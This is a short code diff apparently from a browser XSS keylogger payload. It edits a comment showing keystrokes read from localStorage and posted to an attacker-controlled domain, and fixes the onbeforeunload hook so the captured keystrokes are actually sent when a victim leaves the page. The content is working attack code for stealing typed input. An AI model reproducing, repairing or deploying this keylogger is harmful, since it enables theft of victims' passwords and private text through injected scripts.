@@ -2,8 +2,7 @@
     quininer[http://wiremask.eu/xss-keylogger/] - 140505
     keylogger - null
         - keylogger(local + Not IME)
-            gum.post('http://'+gum.domain+'/ing',
-                {'keylogs':window.localStorage.getItem('gum_keyslog')})
+            gum_postkeylogs()
         and
             browserinfo['keylogs'] = b64encode(str(request.forms.get('keylogs')))
  */
@@ -30,5 +29,5 @@ document.onkeypress = function(e){
 if(gum.jquery()){
     $(window).unload(gum_postkeylogs);
 }else{
-    window.onbeforeunload = gum_postkeylogs();
+    window.onbeforeunload = gum_postkeylogs;
 };
